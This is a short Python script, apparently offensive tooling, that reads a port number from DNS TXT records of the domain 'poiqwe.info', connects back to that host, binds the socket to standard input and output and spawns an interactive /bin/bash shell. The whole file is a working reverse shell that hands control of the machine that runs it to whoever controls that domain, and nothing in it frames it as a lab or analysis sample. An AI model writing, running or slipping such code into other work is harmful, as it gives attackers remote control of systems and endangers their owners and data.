import socket
import os
import pty
import requests
import time
from io import StringIO
import dns.resolver

def connect():
	port = None
	while port == None:
		answers = dns.resolver.resolve('poiqwe.info', 'TXT')
		for answer in answers:
			TXT = str(answer)
			if TXT[1:5] == "port":
				port = TXT[6:-1]
				#print(port)

		time.sleep(1)

	port = int(port)
	target = 'poiqwe.info'
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.settimeout(10)
		s.connect((target,port))
		s.settimeout(None)
		os.dup2(s.fileno(),0)
		os.dup2(s.fileno(),1)
		os.dup2(s.fileno(),2)
		pty.spawn("/bin/bash")
		time.sleep(1)
	except Exception as e:
		exit(False)

	exit(True)

if __name__ == '__main__':
	connect()